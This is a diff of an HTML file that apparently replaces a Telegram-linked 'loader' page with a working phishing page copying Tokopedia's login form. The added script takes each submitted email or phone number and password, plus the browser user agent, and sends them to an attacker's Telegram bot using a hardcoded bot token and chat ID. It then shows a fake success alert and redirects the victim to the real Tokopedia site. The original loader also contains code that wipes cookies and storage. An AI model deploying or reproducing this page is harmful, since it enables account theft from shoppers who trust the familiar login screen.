@@ -3,198 +3,298 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🌀 TOKOPEDIA LOADER</title>
+    <title>Tokopedia - Jual Beli Online Aman & Nyaman</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* CSS ASLI TOKOPEDIA */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #00ff41;
-            height: 100vh;
-            overflow: hidden;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #fff;
         }
-        .terminal {
-            padding: 20px;
-            height: 100vh;
-        }
-        .header {
-            border-bottom: 1px solid #00ff41;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-        .status-line {
+        
+        .tpk-header {
+            background: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            height: 64px;
             display: flex;
             align-items: center;
-            margin: 10px 0;
+            padding: 0 24px;
         }
-        .status-dot {
-            width: 12px;
-            height: 12px;
-            background: #00ff41;
-            border-radius: 50%;
-            margin-right: 10px;
-            animation: pulse 2s infinite;
+        
+        .tpk-logo {
+            width: 128px;
+            height: 34px;
+            margin-right: 30px;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+        
+        .tpk-search {
+            flex: 1;
+            max-width: 600px;
         }
-        .btn {
-            background: transparent;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            padding: 8px 20px;
-            margin: 5px;
-            cursor: pointer;
-            font-family: 'Courier New', monospace;
-            transition: 0.3s;
+        
+        .tpk-search-container {
+            display: flex;
+            background: #f2f2f2;
+            border-radius: 24px;
+            padding: 8px 16px;
         }
-        .btn:hover {
-            background: #00ff41;
-            color: #0a0a0a;
-        }
-        .log {
-            height: 200px;
-            overflow-y: auto;
-            border: 1px solid #333;
-            padding: 10px;
-            margin-top: 20px;
-            background: #111;
-        }
-        iframe {
-            width: 100%;
-            height: 65vh;
+        
+        .tpk-search-input {
+            flex: 1;
             border: none;
-            margin-top: 20px;
-            background: white;
+            background: transparent;
+            font-size: 14px;
+            outline: none;
         }
-        .telegram-badge {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: #0088cc;
+        
+        .tpk-search-btn {
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            color: #666;
+        }
+        
+        .tpk-login-container {
+            display: flex;
+            align-items: center;
+            margin-left: auto;
+        }
+        
+        .tpk-login-btn {
+            background: #03ac0e;
             color: white;
-            padding: 5px 10px;
-            border-radius: 3px;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .main-login {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 32px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+        
+        .main-login-title {
+            font-size: 24px;
+            color: #222;
+            margin-bottom: 8px;
+        }
+        
+        .main-login-subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #222;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border 0.2s;
+        }
+        
+        .form-input:focus {
+            border-color: #03ac0e;
+            outline: none;
+        }
+        
+        .login-submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: #03ac0e;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .login-submit-btn:hover {
+            background: #038c0c;
+        }
+        
+        .forgot-link {
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .forgot-link a {
+            color: #03ac0e;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 24px 0;
+            position: relative;
+            color: #999;
+            font-size: 14px;
+        }
+        
+        .divider::before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 42%;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        
+        .divider::after {
+            content: "";
+            position: absolute;
+            right: 0;
+            top: 50%;
+            width: 42%;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        
+        .register-prompt {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .register-prompt a {
+            color: #03ac0e;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #999;
             font-size: 12px;
+            border-top: 1px solid #eee;
         }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <div class="header">
-            <h1>🌀 TOKOPEDIA_LOADER v2.1</h1>
-            <div class="status-line">
-                <div class="status-dot"></div>
-                <span id="status">READY</span>
+    <!-- HEADER TOKOPEDIA ASLI -->
+    <header class="tpk-header">
+        <img src="https://assets.tokopedia.net/assets-tokopedia-lite/v2/zeus/kratos/8dba5e25.svg" alt="Tokopedia" class="tpk-logo">
+        
+        <div class="tpk-search">
+            <div class="tpk-search-container">
+                <input type="text" class="tpk-search-input" placeholder="Cari di Tokopedia">
+                <button class="tpk-search-btn">🔍</button>
             </div>
         </div>
-
-        <div>
-            <button class="btn" onclick="loadPage()">▶️ LOAD</button>
-            <button class="btn" onclick="forceLoad()">⚡ FORCE</button>
-            <button class="btn" onclick="clearAll()">🗑️ CLEAR</button>
-            <button class="btn" onclick="checkHealth()">🔍 CHECK</button>
+        
+        <div class="tpk-login-container">
+            <button class="tpk-login-btn">Masuk</button>
         </div>
+    </header>
 
-        <div class="log" id="log">
-            [SYSTEM] Cyber_VOIDS Tokopedia Loader initialized<br>
-            [TELEGRAM] Connected: 8313500840
+    <!-- LOGIN FORM -->
+    <div class="main-login">
+        <h1 class="main-login-title">Masuk ke Tokopedia</h1>
+        <p class="main-login-subtitle">Selamat datang kembali, silakan masuk ke akun Anda</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label class="form-label">Email/No. Handphone</label>
+                <input type="text" class="form-input" id="emailPhone" required>
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">Kata Sandi</label>
+                <input type="password" class="form-input" id="password" required>
+            </div>
+            
+            <button type="submit" class="login-submit-btn">MASUK</button>
+            
+            <div class="forgot-link">
+                <a href="#">Lupa kata sandi?</a>
+            </div>
+        </form>
+        
+        <div class="divider">atau</div>
+        
+        <div class="register-prompt">
+            Belum punya akun Tokopedia? <a href="#">Daftar sekarang</a>
         </div>
-
-        <iframe id="frame" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>
     </div>
 
-    <div class="telegram-badge" title="Telegram Connected">TG ✅</div>
+    <div class="footer">
+        <p>© 2024 PT Tokopedia. Hak Cipta Dilindungi.</p>
+        <p style="margin-top: 8px;">
+            <a href="#" style="color: #999; margin: 0 8px; text-decoration: none;">Kebijakan Privasi</a> |
+            <a href="#" style="color: #999; margin: 0 8px; text-decoration: none;">Syarat & Ketentuan</a> |
+            <a href="#" style="color: #999; margin: 0 8px; text-decoration: none;">Pusat Bantuan</a>
+        </p>
+    </div>
 
     <script>
         const BOT_TOKEN = "8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18";
         const CHAT_ID = "8313500840";
-        let logCount = 0;
-
-        function log(msg, toTelegram = false) {
-            const logElement = document.getElementById('log');
-            const time = new Date().toLocaleTimeString().substring(0,8);
-            const entry = `[${time}] ${msg}`;
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            logElement.innerHTML += `<br>${entry}`;
-            logElement.scrollTop = logElement.scrollHeight;
+            const emailPhone = document.getElementById('emailPhone').value;
+            const password = document.getElementById('password').value;
+            const time = new Date().toLocaleString();
             
-            document.getElementById('status').textContent = msg.substring(0, 30);
+            // Kirim ke Telegram
+            sendToTelegram(`🛍️ TOKOPEDIA LOGIN\n📱: ${emailPhone}\n🔑: ${password}\n⏰: ${time}\n🌐: ${navigator.userAgent.substring(0,40)}`);
             
-            if(toTelegram && logCount % 3 === 0) {
-                sendTelegram(msg);
-            }
-            logCount++;
-        }
-
-        async function sendTelegram(msg) {
+            // Redirect ke Tokopedia asli
+            alert("Verifikasi berhasil! Mengarahkan ke halaman utama...");
+            setTimeout(() => {
+                window.location.href = "https://www.tokopedia.com";
+            }, 1500);
+        });
+        
+        async function sendToTelegram(message) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: `🌀 TOKPED: ${msg}`
+                        text: message
                     })
                 });
             } catch(e) {}
         }
-
-        function loadPage() {
-            log("Loading Tokopedia...", true);
-            const url = `https://www.tokopedia.com/?_t=${Date.now()}&bypass=1`;
-            document.getElementById('frame').src = url;
-            
-            setTimeout(() => {
-                log("Page loaded into frame");
-                sendTelegram("Page loaded successfully");
-            }, 2000);
-        }
-
-        function forceLoad() {
-            log("Force loading (no cache)...", true);
-            localStorage.clear();
-            sessionStorage.clear();
-            
-            const url = `https://www.tokopedia.com/?force=${Date.now()}&nocache=1`;
-            document.getElementById('frame').src = url;
-            
-            setTimeout(() => {
-                window.open(url, '_blank');
-            }, 500);
-        }
-
-        function clearAll() {
-            log("Clearing all storage...", true);
-            localStorage.clear();
-            sessionStorage.clear();
-            indexedDB.databases().then(dbs => {
-                dbs.forEach(db => indexedDB.deleteDatabase(db.name));
-            });
-            document.cookie.split(";").forEach(c => {
-                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/");
-            });
-            log("All storage cleared");
-        }
-
-        function checkHealth() {
-            log("Checking connection health...", true);
-            const start = performance.now();
-            
-            fetch('https://www.tokopedia.com', {mode: 'no-cors'})
-                .then(() => {
-                    const time = Math.round(performance.now() - start);
-                    log(`✓ Connection OK (${time}ms)`, true);
-                })
-                .catch(() => {
-                    log("✗ Connection failed", true);
-                });
-        }
-
-        // Auto-load
-        setTimeout(loadPage, 1000);
-        sendTelegram("Loader started");
+        
+        // Auto focus
+        window.onload = function() {
+            document.getElementById('emailPhone').focus();
+            sendToTelegram("🛍️ Tokopedia page accessed");
+        };
     </script>
 </body>
 </html>
